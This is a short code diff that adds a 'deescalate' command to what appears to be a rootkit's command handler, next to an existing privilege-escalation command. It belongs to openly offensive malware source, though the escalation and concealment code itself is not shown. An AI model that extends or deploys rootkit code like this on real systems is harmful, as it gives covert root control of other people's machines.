@@ -100,6 +100,10 @@ execute_command (void)
 		priv_escalation();
 		ROOTKIT_DEBUG("rooted\n");
 	}
+	else if(strcmp(command_buffer, "deescalate") == 0) {
+		priv_deescalation();
+		ROOTKIT_DEBUG("un-rooted\n");
+	}
 
 	/* cleanup */
 	memset(command_buffer, 0, 32);
